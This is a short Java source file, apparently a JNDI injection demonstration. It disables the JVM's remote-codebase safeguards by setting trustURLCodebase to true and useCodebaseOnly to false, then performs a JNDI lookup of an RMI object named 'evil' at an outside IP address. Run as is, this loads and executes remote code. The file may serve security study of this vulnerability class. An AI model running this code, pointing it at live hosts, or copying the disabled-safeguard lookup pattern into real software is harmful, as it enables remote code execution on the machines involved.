import javax.naming.InitialContext;

public class DemoMain {
    public static void main(String[] args)throws Exception {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        System.setProperty("java.rmi.server.useCodebaseOnly","false");
        InitialContext context = new InitialContext();
        Object obj = context.lookup("rmi://21.96.35.46:1099/evil");
        System.out.println(obj);
    }
}
